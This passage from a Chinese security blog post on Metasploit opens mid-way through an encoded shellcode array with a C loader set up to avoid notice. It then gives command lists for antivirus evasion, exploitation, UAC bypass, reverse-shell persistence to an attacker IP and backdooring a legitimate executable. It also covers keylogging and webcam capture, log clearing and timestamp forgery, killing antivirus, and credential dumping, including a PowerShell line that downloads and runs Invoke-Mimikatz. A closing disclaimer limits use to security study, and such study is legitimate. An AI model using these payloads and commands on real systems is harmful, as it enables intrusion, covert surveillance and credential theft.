+&quot;\x43\x62\x40\x3b\x01\x11\xa9\x22\x5b\x93\x08\xb3\x8e\x57\x9a&quot;
+&quot;\x3b\xf2\x6a\x27\x4d\x60\x98\x44\x77\x3d\x4b\x4e\x7f\xec\xdf&quot;
+&quot;\x46\xaf\x22\x17\xeb\xca\x61\xa4\xeb\xe7\x1d\x9b\x07\xe4\xc3&quot;
+&quot;\x80\x0b\xac\x45\xf1\xd7\x24\x6f\xb5\xb2\xf4\x44\x4e\x73\xea&quot;
+&quot;\xbb\x3b\x20\x76\x8a\x94\x4e\x4c\xcc\xe8\xd8\x5e\xf5\xca\xdf&quot;
+&quot;\x38\x7f\x43\x16\xcc\x25\xef\xb7\x50\xa0\xd2\x9d\x0f\x17\xfc&quot;
+&quot;\x8b\x3a\xde\xfd\x6a\xcf\x6b\x0b\x66\x82\x20\x84\x7b\x3d\x68&quot;
+&quot;\x2a\x0a\x1f\x72\x74\x97\x4b\xef\xcf\x50\x28\x7f\xd6\x52\x2e&quot;
+&quot;\xe1\x08\xce\x93\x75\xc4\x7f\x5c\xa0\x14\xed\x6d\x81\x8b\x78&quot;
+&quot;\x2d\x50\x23\x4b\xc8\x06\x24\xb2\x5a\x26\xdc\x5d\xd7\x05\x6c&quot;
+&quot;\xf6\x80\xe6\xfe\xb6\x49\xca\x8e\x49\xf8\x96\xb9\xaa\xd5\xbf&quot;
+&quot;\xad\xd8\xcf\x4b\xf6\x5f\xcf\x81\x9a\x06\x3b\x0f\x4f\x6c\x9d&quot;
+&quot;\xa2\xbc\x6b\x3c\x49\x09\x99\x80\x49\x05\xa8\x94\x6d\xc8\x58&quot;
+&quot;\x4c\x58\xf3\xe4\xee\xc8\x67\x92\xc5\xc8\xc5\x69\x88\x1e\xad&quot;
+&quot;\xd6\x98\x6c\x0d\x6e\xa7\x8b\x62\x22\xdc\xa5\xfd\x75\x1d\x7a&quot;
+&quot;\x35\x2d\x2a\x4d\xb6\xe1\x73\x8c\x3d\x74\xaa\xc5\x3a\x22\x51&quot;
+&quot;\xd0\xe8\x67\x4b\xc7\xae\xb8\x28\xa5\x19\x41\x07\x34\xdc\xae&quot;
+&quot;\xb4\x60\x0d\xda\xfd\xc7\x36\x54\x26\x35\xd9\x8a\x5b\x44\x7a&quot;
+&quot;\x90\x22\x34\x49\xe8\x8f\x60\xa8\xd3\xc6\xa3\x8e\xe7\x62\x84&quot;
+&quot;\x7c\x16\xb0\x50\x75\x1c\xd4\x9d\xfe\x35\x13\x80\x05\xc7\x04&quot;
+&quot;\xf7\x60\x43\x2d\xdd\x04\x16\x36\xba\xaa\xb6\x8e\x5d\x05\x19&quot;
+&quot;\x2d\x8e\xb6\xde\x3b\x8b\x72\x15\x1a\x38\x99\x8e\xe1\x80\x5d&quot;
+&quot;\x6b\x11\xea\xa4\x0c\x88\x58\xa6\x90\x6e\xdc\xfe\x40\xb1\xa7&quot;
+&quot;\x78\x9c\x7f\xcc\xed\x19\x8b\x48\xd5\x6f\x03&quot;;
+
+#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //windows控制台程序不出黑窗口
+
+main()
+
+{
+
+    ( (void(*)(void))&amp;buf)();
+
+}</code></pre><ol start="4">
+<li>然后使用vc++6.0、VS等等编译器编译，生成exe文件。</li>
+<li><img src="/MetasploitFramework/17.png" alt></li>
+<li><img src="/MetasploitFramework/18.png" alt></li>
+</ol>
+<p><strong>动态免杀</strong></p>
+<ol>
+<li>即使meterpreter回连成功了，杀软会在meterpreter交互时报毒。</li>
+<li>切换不同的payload来绕过杀软动态检测，还有设置：</li>
+<li>set EnableStageEncoding true #将控制端向被控制端发送的stage进行编码，使用reverse_tcp_rc4也有同样的效果，而且不用设置stageencoder选项</li>
+<li>set stageencoder x86/fnstenv_mov</li>
+<li>set stageencodingfallback false</li>
+<li>set exitonsession false  #可以让建立监听的端口继续保持侦听，可以接受多个session</li>
+<li>set SessionCommunicationTimeout 0 #默认一个会话在5分钟没有任何活动，就会被杀死，设置为0防止被杀死</li>
+<li>set SessionExpirationTimeout 0 #默认一周后，强制关闭会话，设置为0可永久不会被关闭</li>
+<li>set stagerverifysslcert false  #防止获取shell的时候出现的SSL_accept错误</li>
+<li>set prependmigrate true #自动注入进程</li>
+<li>set prependmigrateProc svchost.exe</li>
+<li>set autorunscript migrate -f #获取shell后，将自动迁移到另一个进程</li>
+<li>set AutoRunScript post/windows/manage/migrate</li>
+</ol>
+<h2 id="0x12-常驻免杀"><a href="#0x12-常驻免杀" class="headerlink" title="0x12 常驻免杀"></a>0x12 常驻免杀</h2><ol>
+<li><strong>msf的persistence和metsvc</strong></li>
+<li>msf5 &gt; search persistence #搜索相关payload</li>
+<li><strong>powerspolit</strong></li>
+</ol>
+<h2 id="0x20-Metasploit"><a href="#0x20-Metasploit" class="headerlink" title="0x20 Metasploit"></a>0x20 Metasploit</h2><ol>
+<li>use [name|term|index] #使用指定模块，auxiliary/、evasion/、exploit/、payload/、post/，可当作搜索使用</li>
+<li>use ms17-010</li>
+<li><img src="/MetasploitFramework/1.png" alt></li>
+</ol>
+<h2 id="0x21-信息搜集"><a href="#0x21-信息搜集" class="headerlink" title="0x21 信息搜集"></a>0x21 信息搜集</h2><ol>
+<li>use auxiliary/scanner/discovery/arp_sweep</li>
+<li>use auxiliary/scanner/ftp/anonymous</li>
+<li>use auxiliary/scanner/ftp/ftp_login</li>
+<li>use auxiliary/scanner/http/backup_file</li>
+<li>use auxiliary/scanner/http/brute_dirs</li>
+<li>use auxiliary/scanner/http/dir_scanner</li>
+<li>use auxiliary/scanner/http/web_vulndb</li>
+<li>use auxiliary/scanner/portscan/syn</li>
+<li>use auxiliary/scanner/rdp/rdp_scanner</li>
+<li>use auxiliary/gather/censys_search</li>
+<li>use auxiliary/gather/enum_dns</li>
+<li>use auxiliary/gather/shodan_search</li>
+<li>use auxiliary/scanner/http/crawler</li>
+<li>use auxiliary/scanner/http/phpmyadmin_login</li>
+<li>use auxiliary/scanner/http/svn_scanner</li>
+<li><img src="/MetasploitFramework/2.png" alt> </li>
+<li><img src="/MetasploitFramework/3.png" alt> </li>
+</ol>
+<h2 id="0x22-漏洞探测与利用"><a href="#0x22-漏洞探测与利用" class="headerlink" title="0x22 漏洞探测与利用"></a>0x22 漏洞探测与利用</h2><ol>
+<li>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</li>
+<li>use auxiliary/admin/http/gitstack_rest</li>
+<li>use auxiliary/admin/http/tomcat_administration </li>
+<li>use auxiliary/admin/mssql/mssql_enum </li>
+<li>use auxiliary/admin/oracle/oraenum</li>
+<li>use auxiliary/admin/smb/ms17_010_command</li>
+<li>use auxiliary/scanner/http/citrix_dir_traversal</li>
+<li>use auxiliary/scanner/http/iis_shortname_scanner </li>
+<li><strong>漏洞不存在例子：</strong></li>
+<li><img src="/MetasploitFramework/4.png" alt> </li>
+<li><img src="/MetasploitFramework/5.png" alt> </li>
+<li><strong>漏洞存在例子：</strong></li>
+<li><img src="/MetasploitFramework/6.png" alt></li>
+<li><img src="/MetasploitFramework/7.png" alt></li>
+</ol>
+<h2 id="0x23-权限提升"><a href="#0x23-权限提升" class="headerlink" title="0x23 权限提升"></a>0x23 权限提升</h2><ol>
+<li>getsystem #最直接的提权命令</li>
+<li><img src="/MetasploitFramework/8.png" alt></li>
+<li><strong>通过进程注入使用可信任发布者证书绕过UAC</strong></li>
+<li>use exploit/windows/local/bypassuac</li>
+<li>set session 1</li>
+<li>exploit</li>
+<li>use exploit/windows/local/bypassuac_fodhelper</li>
+<li>set session 1</li>
+<li>exploit</li>
+</ol>
+<h2 id="0x24-内网渗透"><a href="#0x24-内网渗透" class="headerlink" title="0x24 内网渗透"></a>0x24 内网渗透</h2><ol>
+<li>run get[tab两下] #列出相关命令</li>
+<li>run get_env #获取环境变量</li>
+<li>run get_application_list #获取应用列表</li>
+<li>run get_local_subnets #获取网段</li>
+</ol>
+<h2 id="0x25-MSF5-gt-命令"><a href="#0x25-MSF5-gt-命令" class="headerlink" title="0x25 MSF5&gt;命令"></a>0x25 MSF5&gt;命令</h2><ol>
+<li>sessions -l #列出所有会话</li>
+<li>sessions [num] #切换到指定会话</li>
+<li>sessions -K #杀死所有会话</li>
+</ol>
+<hr>
+<h2 id="0x30-Meterpreter"><a href="#0x30-Meterpreter" class="headerlink" title="0x30 Meterpreter"></a>0x30 Meterpreter</h2><h2 id="0x31-常用命令"><a href="#0x31-常用命令" class="headerlink" title="0x31 常用命令"></a>0x31 常用命令</h2><ol>
+<li>help #查看帮助</li>
+<li>background #当前会话放到后台</li>
+<li>run &lt;script&gt; #执行现有模块，run [按两下tab即可列出已有脚本]</li>
+<li>info &lt;script&gt; #查看脚本的信息，info [按两下tab即可列出已有脚本] </li>
+<li>getuid #查看权限</li>
+<li>getsystem #最直接的提权命令</li>
+<li>sysinfo #查看目标主机的系统信息</li>
+<li>idletime #查看目标主机闲置时间</li>
+<li>reboot/shutdown #重启关机</li>
+<li>shell #进入目标主机的shell</li>
+<li>meterpreter &gt; powershell_shell #切换到powershell终端</li>
+<li>meterpreter &gt; powershell_import xxx.ps1 #执行ps1文件</li>
+<li>meterpreter &gt; powershell_execute xxx.exe #</li>
+<li><code>ps</code> #列出所有进程</li>
+<li><code>getpid</code> #获取当前进程的pid</li>
+<li><code>migrate PID</code> #迁移服务到其他进程</li>
+<li>kill PID #杀死进程</li>
+<li><code>run post/windows/manage/migrate</code> #自动迁移进程到其他进程</li>
+<li>load [tab两下] #加载模块</li>
+</ol>
+<h2 id="0x32-文件操作命令"><a href="#0x32-文件操作命令" class="headerlink" title="0x32 文件操作命令"></a>0x32 文件操作命令</h2><ol>
+<li>cat [filename] #读文件</li>
+<li>getwd #获取目录</li>
+<li>cd #切换目录</li>
+<li>download [filename] #下载文件</li>
+<li>upload [filename] #上传文件</li>
+</ol>
+<h2 id="0x33-网络命令"><a href="#0x33-网络命令" class="headerlink" title="0x33 网络命令"></a>0x33 网络命令</h2><ol>
+<li>arp #查看目标主机arp缓存</li>
+<li>getproxy #查看当前代理设置</li>
+<li><code>portfwd add -l 33389 -p 3389 -r 127.0.0.1</code> #端口转发，将目标主机的3389转发到本机的33389，rdesktop 127.0.0.1:33389</li>
+<li>route #查看路由表</li>
+<li>run autoroute -s 192.168.10.1/24 #添加到目标网络环境</li>
+<li>run autoroute -p #查看添加的路由</li>
+<li>run post/windows/gather/arp_scanner rhosts=IP/24 #扫描主机</li>
+<li>run auxiliary/scanner/portscan/tcp rhosts=IP ports=PORT #扫描端口</li>
+</ol>
+<h2 id="0x34-系统命令"><a href="#0x34-系统命令" class="headerlink" title="0x34 系统命令"></a>0x34 系统命令</h2><ol>
+<li>clearev #清除日志</li>
+<li>execute -H -i -f cmd.exe #执行命令，-H：隐藏，-i：交互</li>
+<li>getenv #获取环境变量</li>
+<li>getprivs #获取当前进程可用的所有特权</li>
+<li>getsid #获取当前用户的SID</li>
+<li>pgrep #按名称过滤进程</li>
+<li>pkill #按名称杀死进程</li>
+<li>reg #修改远程注册表</li>
+</ol>
+<h2 id="0x35-其他命令"><a href="#0x35-其他命令" class="headerlink" title="0x35 其他命令"></a>0x35 其他命令</h2><ol>
+<li>uictl [enable/disable] [keyboard/mouse/all] #开启或禁止键盘、鼠标</li>
+<li>webcam_list #查看摄像头</li>
+<li>webcam_snap #通过摄像头拍照</li>
+<li>webcam_stream #通过摄像头开启视频</li>
+<li>screenshot #截图</li>
+<li>run post/windows/gather/checkvm #检查是否虚拟机</li>
+<li>run post/windows/manage/killav #关闭杀软</li>
+<li>run post/windows/manage/enable_rdp #开3389</li>
+<li>run getgui -e #开启远程桌面</li>
+<li>run getgui -f 33389 -e #3389端口转发到33389</li>
+<li>run getgui -u username -p password #添加用户</li>
+<li>keyscan_start #开启键盘记录</li>
+<li>keyscan_dump #查看键盘记录</li>
+<li>keyscan_stop #停止键盘记录</li>
+</ol>
+<h2 id="0x36-timestomp（文件时间）"><a href="#0x36-timestomp（文件时间）" class="headerlink" title="0x36 timestomp（文件时间）"></a>0x36 timestomp（文件时间）</h2><ol>
+<li><code>timestomp -v c:\\test.exe</code> #显示文件时间信息，Modified：修改日期，Accessed：访问时间，Created：创建日期</li>
+<li><img src="/MetasploitFramework/25.png" alt></li>
+<li>timestomp -z [时间，格式：MM/DD/YYYY HH24:MI:SS] [目标文件]</li>
+<li><code>timestomp -z &quot;01/01/2020 00:00:00&quot; c:\\test.exe</code> #修改文件时间</li>
+<li><img src="/MetasploitFramework/26.png" alt></li>
+<li>timestomp -b [目标文件] #清空文件时间</li>
+</ol>
+<h2 id="0x40-权限维持"><a href="#0x40-权限维持" class="headerlink" title="0x40 权限维持"></a>0x40 权限维持</h2><p><strong>persistence模块</strong><br>2. run persistence -h #查看帮助<br>4. <img src="/MetasploitFramework/9.png" alt><br>3. -A #自动匹配连接代理<br>4. -L &lt;payload位置&gt;<br>5. -P <payload> #默认windows/meterpreter/reverse_tcp<br>6. -S #作为system权限执行<br>7. -U #用户登录自动启动代理<br>8. -X #系统启动自动启动代理<br>9. -i num #间隔num秒尝试连接<br>10. -p #攻击者端口<br>11. -r #攻击者IP</payload></p>
+<ol>
+<li><strong>安装后门</strong></li>
+<li>run persistence -X -i 30（多少秒发送一次连接） -p 1314（端口） -r 192.168.100.4（控制者IP）</li>
+</ol>
+<p><strong>获取meterpreter后，假设session为1</strong></p>
+<ol>
+<li>background </li>
+<li><strong>攻击机开启后门监听</strong></li>
+<li>use exploit/multi/handler</li>
+<li>set payload windows/meterpreter/reverse_tcp</li>
+<li>set lhost 192.168.100.4 #端口跟之前的获取到的meterpreter一样</li>
+<li>run -j #后台监听</li>
+<li>use exploit/windows/local/registry_persistence</li>
+<li>set session 1</li>
+<li>run #这样就会在受害机的注册表中注入后门，受害机重启后会操纵powershell来执行代码反弹meterpreter</li>
+<li>受害机重启登录后就会获取新meterpreter</li>
+<li><img src="/MetasploitFramework/22.png" alt></li>
+<li><strong>相关模块</strong></li>
+<li><img src="/MetasploitFramework/23.png" alt></li>
+</ol>
+<p><strong>捆绑守护进程，假设phpstudy.exe，获得meterpreter之后</strong></p>
+<ol>
+<li>ps -S phpStudy.exe #找到目的应用程序</li>
+<li>pkill phpStudy.exe #杀掉应用程序</li>
+<li>search -f phpStudy.exe -d C: #可遍历查找目的应用程序</li>
+<li>download C:\phpStudy\phpStudy.exe #直接下载目的应用程序</li>
+<li>background #meterpreter放到后台</li>
+<li><strong>在目的程序上捆绑后门</strong></li>
+<li>use payload/windows/meterpreter/reverse_tcp</li>
+<li>set lhost 192.168.100.4 #攻击机IP</li>
+<li>generate -p windows -x /root/phpStudy.exe -k -f exe -o /root/phpStudy_backdoor.exe</li>
+<li>use exploit/multi/handler </li>
+<li>set payload windows/meterpreter/reverse_tcp</li>
+<li>set lhost 192.168.100.4</li>
+<li>run -j</li>
+<li><img src="/MetasploitFramework/24.png" alt></li>
+<li>回到meterpreter</li>
+<li>sessions 2</li>
+<li>cd C:\phpStudy\</li>
+<li>mv phpStudy.exe phpStudy_bak.exe</li>
+<li>upload /root/phpStudy_backdoor.exe</li>
+<li>mv phpStudy_backdoor.exe phpStudy.exe</li>
+<li>shell</li>
+<li>net start phpStudy.exe </li>
+<li>phpStudy.exe启动后就会获取meterpreter</li>
+</ol>
+<p><strong>metsvc模块</strong></p>
+<ol>
+<li><img src="/MetasploitFramework/10.png" alt></li>
+<li>run metsvc #即可重新获取新meterpreter</li>
+</ol>
+<h2 id="0x50-痕迹清除"><a href="#0x50-痕迹清除" class="headerlink" title="0x50 痕迹清除"></a>0x50 痕迹清除</h2><ol>
+<li>clearev #windows版清除日志</li>
+</ol>
+<h2 id="0x60-mimikatz相关命令"><a href="#0x60-mimikatz相关命令" class="headerlink" title="0x60 mimikatz相关命令"></a>0x60 mimikatz相关命令</h2><ol>
+<li>getuid #查看权限</li>
+<li>getsystem #最直接的提权命令</li>
+<li>run hashdump #获取密码的hash</li>
+<li>load mimikatz #加载mimikatz扩展</li>
+<li>load kiwi #加载mimikatz扩展（新版）</li>
+<li>tspkg #尝试检索tspkg凭证</li>
+<li>msv #尝试检索tspkg凭据（hash）</li>
+<li>hashdump #获取hash</li>
+</ol>
+<p><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener"><strong>impacket secretsdump.py</strong></a></p>
+<ol>
+<li>secretsdump.py [username]:[password]@IP</li>
+<li><img src="/MetasploitFramework/27.png" alt></li>
+</ol>
+<p><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener"><strong>impacket psexec.py</strong></a></p>
+<ol>
+<li>psexec.py [username]:[password]@IP cmd</li>
+<li><img src="/MetasploitFramework/28.png" alt></li>
+<li>powershell -exec bypass -command “iex(new-object system.net.webclient).downloadstring(‘URL/Invoke-Mimikatz.ps1’);invoke-mimikatz”</li>
+<li>sekurlsa::logonpasswords</li>
+</ol>
+<h2 id="0xF0-工具帮助信息"><a href="#0xF0-工具帮助信息" class="headerlink" title="0xF0 工具帮助信息"></a>0xF0 工具帮助信息</h2><p><span id="msfvenom"><strong>msfvenom</strong></span></p>
+<pre><code>Options:
+    -l, --list            &lt;type&gt;        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等
+    -p, --payload         &lt;payload&gt;     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取
+        --list-options                  # 列出--payload &lt;value&gt; 的标准，高级和规避选项
+    -f, --format          &lt;format&gt;      # 指定 Payload 的输出格式(使用 --list formats 列出)
+    -e, --encoder         &lt;encoder&gt;     # 指定使用的 Encoder (使用 --list encoders 列出)
+        --sec-name        &lt;value&gt;       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串
+        --smallest                      # 使用所有可用的编码器生成最小的payload
+        --encrypt         &lt;value&gt;       # 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)
+        --encrypt-key     &lt;value&gt;       # 用于加密的密钥
+        --encrypt-iv      &lt;value&gt;       # 加密的初始化向量
+    -a, --arch            &lt;arch&gt;        # 指定目标系统架构(使用 --list archs  列出)
+        --platform        &lt;platform&gt;    # 指定目标系统平台 (使用 --list platforms 列出)
+    -o, --out             &lt;path&gt;        # 保存payload文件
+    -b, --bad-chars       &lt;list&gt;        # 设置需要在 Payload 中避免出现的字符，如： &#39;\x00\xff&#39;
+    -n, --nopsled         &lt;length&gt;      # 指定 nop 在 payload 中的数量
+    -s, --space           &lt;length&gt;      # 设置未经编码的 Payload 的最大长度
+        --encoder-space   &lt;length&gt;      # 编码后的 Payload 的最大长度
+    -i, --iterations      &lt;count&gt;       # 设置 Payload 的编码次数
+    -c, --add-code        &lt;path&gt;        # 指定包含一个额外的win32 shellcode文件
+    -x, --template        &lt;path&gt;        # 指定一个特定的可执行文件作为模板
+    -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行
+    -v, --var-name        &lt;value&gt;       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）
+    -t, --timeout         &lt;second&gt;      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）
+    -h, --help                          # 帮助</code></pre><h2 id="0xFE-参考"><a href="#0xFE-参考" class="headerlink" title="0xFE 参考"></a>0xFE 参考</h2><p><a href="https://www.freebuf.com/sectool/118714.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/118714.html</a><br><a href="https://blkwindy.top/2019/07/26/Metasploit%E2%80%94%E2%80%94msfvenom%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC/" target="_blank" rel="noopener">https://blkwindy.top/2019/07/26/Metasploit%E2%80%94%E2%80%94msfvenom%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC/</a><br><a href="https://www.freebuf.com/articles/system/227463.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/227463.html</a></p>
+<h2 id="0xFF-C语言版shellcode"><a href="#0xFF-C语言版shellcode" class="headerlink" title="0xFF C语言版shellcode"></a>0xFF C语言版shellcode</h2><pre><code>unsigned char buf[] = 
+
+&quot;shellcode is here&quot;;
+
+main()
+
+{
+
+    ( (void(*)(void))&amp;buf)();
+
+}</code></pre><pre><code>unsigned char buf[] = 
+
+&quot;shellcode is here&quot;;
+main()
+
+{
+
+    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    memcpy(Memory, buf, sizeof(buf));
+
+    ((void(*)())Memory)();
+
+}</code></pre>
+      
+       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，本博客仅供于安全测试学习，禁止非法利用。—— </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>MetasploitFramework</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-05-04, 22:54:45</p>
+    <p><span class="copy-title">最后更新:</span>2020-06-30, 20:50:40</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/MetasploitFramework/" title="MetasploitFramework">https://10fteam.github.io/MetasploitFramework/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2020 10fteam</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#CTF','#encrypt_decrypt','#知识','#backdoor','#shell','#C2','#漏洞','#kali','#工具','#内网渗透','#HTB','#靶机','#writeup','#CVE','#vulhub','#Linux','#信息搜集','#安全加固','#入侵检测','#应急响应','#linux','#脚本','#MSF','#proxy','#PHP','#代码审计','#POC','#EXP','#PWN','#注入','#phpmyadmin','#SQL','#python','#数据库','#mssql','#中间件','#Struts2','#weblogic','#windows','#mimikatz','#xss','#DOM','#bypass','#encode_decode','#后门','#靶场','#vulnhub','#僵尸网络','#域渗透','#端口','#提权','#webshell','#CDN','#DLL','#免杀','#绕过','#WAF','#MISC','#逆向',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        <!--width: 542px;-->
+        width: 270px;
+    }
+    .nav.fullscreen {
+        <!--margin-left: -542px;-->
+        margin-left: -270px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+
+
+</html>
